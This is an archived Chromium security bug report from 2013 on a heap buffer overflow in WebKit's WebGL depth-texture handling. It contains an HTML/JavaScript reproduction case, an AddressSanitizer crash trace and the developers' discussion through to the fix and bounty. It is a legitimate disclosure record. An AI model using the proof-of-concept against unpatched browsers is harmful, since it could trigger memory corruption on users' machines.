# Security: out of bounds write with webgl and gl.DEPTH_COMPONENT

| Field | Value |
|-------|-------|
| **Issue ID** | [40077020](https://issues.chromium.org/issues/40077020) |
| **Status** | New |
| **Severity** | S3-Low |
| **Priority** | P4 |
| **Component** | Blink, Blink>WebGL |
| **Platforms** | Linux |
| **Reporter** | mi...@gmail.com |
| **Assignee** | kb...@chromium.org |
| **Created** | 2013-02-23 |
| **Bounty** | $1,000.00 |

## Description


VULNERABILITY DETAILS
out of bounds write with webgl and gl.DEPTH_COMPONENT


VERSION
Chrome Version: dev
Operating System: linux + mesa + intel

REPRODUCTION CASE
<html>
  <head>
    <script>
      var canvas = document.createElement('canvas')
      var gl = canvas.getContext('experimental-webgl')
      gl.texImage2D(gl.TEXTURE_2D, 0, 0, gl.DEPTH_COMPONENT, gl.UNSIGNED_SHORT, canvas)
    </script>
  </head>
  <body>
  </body>
</html>


FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
Type of crash: gpu + asan
Crash State: 

==22578== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60a800016790 at pc 0x555559f93623 bp 0x7fffffff6470 sp 0x7fffffff6468
WRITE of size 1 at 0x60a800016790 thread T0 (asan-release)
    #0 0x555559f93622 in convert<9, 0> /b/build/slave/ASAN_Release/build/third_party/WebKit/Source/WebCore/platform/graphics/GraphicsContext3D.cpp:780
    #1 0x555559f83349 in packPixels /b/build/slave/ASAN_Release/build/third_party/WebKit/Source/WebCore/platform/graphics/GraphicsContext3D.cpp:1382
    #2 0x555559f82e1d in packImageData 

0x60a800016790 is located 0 bytes to the right of 90000-byte region [0x60a800000800,0x60a800016790)
allocated by thread T0 (asan-release) here:
    #0 0x5555566a9ec2 in malloc ??:0
    #1 0x555558b6cf38 in fastMalloc /b/build/slave/ASAN_Release/build/third_party/WebKit/Source/WTF/wtf/FastMalloc.cpp:285
    #2 0x555559f4028b in allocateBuffer /b/build/slave/ASAN_Release/build/third_party/WebKit/Source/WTF/wtf/Vector.h:259


90000 is size of canvas * 2

canvas.width=16
canvas.height=16

--> 512 byte buffer.


## Attachments

- [sksk.txt](attachments/sksk.txt) (text/plain; charset=us-ascii, 6.1 KB)
- [sksk.html](attachments/sksk.html) (text/html; charset=us-ascii, 275 B)
- [webgl-depth-texture.html](attachments/webgl-depth-texture.html) (text/html; charset=us-ascii, 15.3 KB)

## Timeline

### pa...@chromium.org (2013-02-26)

Adding kbr for potential clues — the repro seems straightforward, but I can't repro it on my Linux/ASAN yet. (Nor Mac.)

### kb...@chromium.org (2013-02-26)

Hmm. I think WebKit should reject attempts to upload a canvas as a DEPTH_COMPONENT texture.


### kb...@chromium.org (2013-02-26)

If this test case is complete then something is very wrong -- attempts to upload depth textures at all should be rejected unless the WEBGL_depth_texture extension has been enabled, which it hasn't been here.


### pa...@chromium.org (2013-02-26)

Any thoughts on severity, Ken?

### kb...@chromium.org (2013-02-26)

I suspect it's high severity. It'll be writing past the end of a buffer on the C heap.

I've reproduced it locally with an ASAN build and see where the logic error is in the WebGL implementation. This call should never be legal and should always cause an INVALID_OPERATION OpenGL error.


### kb...@chromium.org (2013-02-27)

To be clear: M25 is not affected (just tested the ASAN build Abhishek pointed me to).


### sc...@gmail.com (2013-02-27)

Seems we're grateful for a regression catch. Adding reward-topanel.

Ken, it _does_ affect M26 tho?

### kb...@chromium.org (2013-02-27)

Yes. Just confirmed that the ASAN 26.0.1410.12 beta build is affected.


### kb...@chromium.org (2013-02-27)

[Empty comment from Monorail migration]

### kb...@chromium.org (2013-02-27)

This is an expanded version of the webgl-depth-texture.html conformance test which catches this as well as other buggy code paths in WebKit.


### kb...@chromium.org (2013-02-27)

Fixed in https://bugs.webkit.org/show_bug.cgi?id=110931 / http://trac.webkit.org/changeset/144241 . Needs to be merged back to M26. Abhishek, would you do this or should I? Should we wait until the fix is tested on Canary?


### in...@chromium.org (2013-02-27)

Ken, we would do the merges when the merge window opens, thanks for the fix.

### sc...@gmail.com (2013-03-02)

Nice regression catch!
$1000

### sc...@gmail.com (2013-03-02)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-12)

M26: http://trac.webkit.org/changeset/145454

### pa...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-05)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-10)

[Empty comment from Monorail migration]

### pa...@chromium.org (2013-06-10)

[Empty comment from Monorail migration]

### js...@chromium.org (2013-11-18)

Bulk release of old security bug reports.


### tk...@chromium.org (2014-06-20)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/177873?no_tracker_redirect=1

[Multiple monorail components: Blink, Blink>WebGL]
[Monorail mergedwith: crbug.com/chromium/178982]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40077020)*
